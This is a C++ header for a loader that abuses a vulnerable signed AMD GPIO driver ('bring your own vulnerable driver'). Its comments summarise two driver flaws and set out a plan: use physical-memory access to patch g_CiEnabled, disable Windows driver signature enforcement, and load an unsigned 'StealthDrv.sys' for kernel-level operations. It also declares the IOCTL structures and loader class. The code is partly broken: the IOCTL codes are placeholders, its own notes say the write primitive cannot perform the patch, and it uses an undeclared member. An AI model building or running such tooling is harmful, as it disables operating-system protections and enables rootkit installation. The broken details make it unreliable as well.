#pragma once
#include <windows.h>
#include <cstdint>
#include <string>
#include <vector>

// ======================================================================
// BYOVD Loader for amdgpio3.sys
//
// ==================== REVERSE ENGINEERING SUMMARY ====================
// Audit Date: 2026-06-17
// Driver: amdgpio3.sys (SHA-256: 0422d184...)
// Architecture: x64 / WDF (KMDF)
// Image base: 0x140000000
//
// VULNERABILITY #1 — CRITICAL (CWE-119/822)
// Function: sub_1400012A0 (EvtIoDeviceControl) +0x9D (VA: 0x14000133D)
//
// The driver reads a 64-bit PHYSICAL_ADDRESS from user input at OFFSET +4
// and passes it WITHOUT VALIDATION to MmMapIoSpace(). The only guard is
// a size check at OFFSET +0xC (< 0x20).
//
// Input buffer (METHOD_BUFFERED):
//   [+0x00] DWORD     reserved/header
//   [+0x04] PHYSICAL_ADDRESS  target physical address (LARGE_INTEGER, 8 bytes)
//   [+0x0C] DWORD     size (must be < 0x20 / 32)
//
// Output buffer:
//   [+0x00] QWORD     reserved/status
//   [+0x08] QWORD     the physical address we sent
//   [+0x10] QWORD     mapped kernel virtual address (can't read from usermode)
//   [+0x18] DWORD     32 (the MmMapIoSpace size)
//   [+0x1C] DWORD     5 (written to physical address +0xC by the driver)
//
// The driver writes a FIXED value (5) to the mapped physical address+0xC.
// This means we can only do a LIMITED PHYSICAL WRITE (always writes 5).
//
// VULNERABILITY #2 — HIGH (CWE-129)
// 10 handlers use the pattern: *a2 as GPIO bank index (WORD)
//   *((BYTE *)a2 + 2) as pin bit-shift index
// The bank index is NEVER range-checked before 56-byte stride array access.
//
// ==================== USAGE ====================
// The primary use of this BYOVD is to:
//   1. Load amdgpio3.sys (signed by AMD → passes DSE)
//   2. Open \\.\AMDGPIO device
//   3. Use vulnerability #1 to read/write PHYSICAL MEMORY pages
//   4. Find and patch g_CiEnabled (disable DSE in ci.dll)
//   5. Load StealthDrv.sys via SCM (now DSE is disabled)
//   6. Connect to \\.\StealthDrv for Ring-0 memory operations
//   7. Unload amdgpio3.sys
//
// NOTE: The exact IOCTL code needs RE verification from the binary.
// The code below uses a configurable placeholder.
// ======================================================================

// ======================================================================
// Known IOCTL codes from amdgpio3.sys (needs RE verification)
// These need to be reverse-engineered from the driver binary.
// The vulnerability is in sub_1400012A0 (EvtIoDeviceControl).
// ======================================================================

// Device type - typically 0x8000 for vendor-specific or 0x22 for unknown
#define FILE_DEVICE_AMDGPIO 0x8000

// IOCTL for physical memory mapping (Vulnerability #1)
// RE NOTE: The actual function code needs to be extracted from the
// IOCTL dispatch table in sub_1400012A0. Common function codes for
// AMD GPIO drivers are in the range 0x800-0x900.
// ========== PLACEHOLDER - MUST VERIFY WITH RE ==========
#define IOCTL_AMDGPIO_MAP_PHYSICAL \
    CTL_CODE(FILE_DEVICE_AMDGPIO, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

// ======================================================================
// Structures based on the RE audit (sub_14000132F-0x140001341)
// ======================================================================

#pragma pack(push, 4)

// Input structure for physical memory mapping IOCTL
struct PhysMapInput {
    DWORD  Reserved;           // [+0x00] header/control
    DWORD64 PhysicalAddress;   // [+0x04] PA to map (8 bytes, LARGE_INTEGER)
    DWORD  Size;               // [+0x0C] must be < 0x20
    // Total: 0x10 bytes minimum per audit (need to reach offset 0x0C + 4)
};

// Output structure from physical memory mapping IOCTL (FIXED: +0x00 reserved QWORD)
// Audit shows: *((_QWORD *)a2 + 1) = PA at output+0x08
//              *((_QWORD *)a2 + 2) = KVA at output+0x10
//              *((_DWORD *)a2 + 6) = 32 at output+0x18
struct PhysMapOutput {
    DWORD64 Reserved;           // [+0x00] unknown/reserved field
    DWORD64 PhysicalAddress;    // [+0x08] PA echoed back
    DWORD64 MappedKernelVA;     // [+0x10] kernel VA (Ring-0 only)
    DWORD   MappedSize;         // [+0x18] always 32
    DWORD   WrittenValue;       // [+0x1C] always 5 (written to PA+0xC by driver)
};

// GPIO bank operation input (from Vulnerability #2 handlers)
// NOTE: Not yet used — requires RE of the GPIO handler IOCTL codes
// These handlers are in: sub_140001088, sub_140001144, sub_140001278, etc.
struct GpioBankInput {
    WORD   BankIndex;           // [+0x00] GPIO bank index (UNCHECKED - OOB!)
    BYTE   PinIndex;            // [+0x02] pin index for bit-shift
    BYTE   Reserved;            // [+0x03]
    DWORD  Value;               // [+0x04] optional value
};

#pragma pack(pop)

// ======================================================================
// Physical memory read/write using amdgpio3
// Since the IOCTL returns a kernel VA that we can't use from user-mode,
// we use the GPIO bank handlers (Vulnerability #2) to read/write through
// the mapped physical pages IF the mapped addresses correspond to GPIO
// bank descriptors that the driver has initialized.
//
// Alternative: For each physical page we want to read/write:
//   1. Map the PA using the IOCTL → driver maps it and writes 5 to PA+0xC
//   2. The write confirms the mapping worked
//   3. But we still can't read the contents
//
// PRACTICAL USE: DSE Bypass via pattern scan
//   Since we only get a write-5-to-PA+0xC primitive, the most practical
//   use is a targeted DSE bypass by finding g_CiEnabled and patching it.
//   This requires:
//     a. Finding ci.dll in kernel memory (via NtQuerySystemInformation)
//     b. Mapping its physical pages
//     c. Patching g_CiEnabled (requires precise write, not just write-5)
//
// For a robust implementation, we combine:
//   - Vulnerability #1: to confirm page mapping
//   - GPIO bank handlers: to read/write mapped memory
//   - OR use a different approach entirely
// ======================================================================

// ======================================================================
// Kernel module info structure (from NtQuerySystemInformation)
// ======================================================================
#pragma pack(push, 1)
struct RTL_PROCESS_MODULE_INFORMATION {
    ULONG   Reserved1;
    ULONG   Reserved2;
    PVOID   ImageBaseAddress;
    ULONG   ImageSize;
    ULONG   Flags;
    WORD    LoadOrderIndex;
    WORD    InitOrderIndex;
    WORD    LoadCount;
    WORD    ModuleNameOffset;
    CHAR    ImageName[256];
};

struct RTL_PROCESS_MODULES {
    ULONG  NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
};
#pragma pack(pop)

// ======================================================================
// BYOVD Loader class
// ======================================================================
class ByovdLoader {
public:
    ByovdLoader();
    ~ByovdLoader();

    // --- Main lifecycle ---
    bool LoadDriver(const std::wstring& driverPath);
    bool DisableDSE();                    // Disable Driver Signature Enforcement
    bool LoadTargetDriver(const std::wstring& targetDrvPath);  // Load StealthDrv.sys
    void Unload();

    bool IsLoaded() const { return m_deviceHandle != INVALID_HANDLE_VALUE && m_deviceHandle != NULL; }
    bool IsDseDisabled() const { return m_dseDisabled; }

    // --- Physical memory primitives ---
    bool PhysRead(DWORD64 physicalAddr, void* buffer, DWORD size);
    bool PhysWrite(DWORD64 physicalAddr, const void* buffer, DWORD size);

    // --- Kernel module enumeration ---
    DWORD64 FindKernelBase();
    DWORD64 FindModuleInKernel(const char* moduleName);

    // --- VaToPa (Virtual → Physical address) ---
    // Uses kernel page table walking via physical memory access
    DWORD64 VaToPa(DWORD64 virtualAddr);

    // Singleton
    static ByovdLoader& Instance();

private:
    // --- Service management ---
    bool InstallService(const std::wstring& binaryPath);
    bool StartService();
    bool StopService();
    bool DeleteService();
    bool OpenDevice();

    // --- DSE helpers ---
    DWORD64 FindCiDllBase();
    DWORD64 FindGCiEnabled();

    // --- IOCTL ---
    bool SendPhysicalIoctl(const PhysMapInput& input, PhysMapOutput& output);

    // State
    HANDLE   m_deviceHandle;
    HANDLE   m_serviceHandle;
    WCHAR    m_serviceName[64];
    bool     m_stealthDrvLoaded;

    // Known kernel base for offset calculations
    DWORD64  m_kernelBase;
    DWORD64  m_ciDllBase;

    // IOCTL code (may need adjustment based on RE)
    DWORD    m_mapPhysIoctlCode;

    // Service management handles
    SC_HANDLE m_scmHandle;
};

// ======================================================================
// Helper: DSE bypass constants
// ======================================================================
#define CI_DLL_NAME "ci.dll"
#define STEALTH_DRV_SERVICE L"StealthDrv"
#define AMDGPIO_SERVICE L"amdgpio3"
#define STEALTH_DRV_BIN L"System32\\drivers\\StealthDrv.sys"
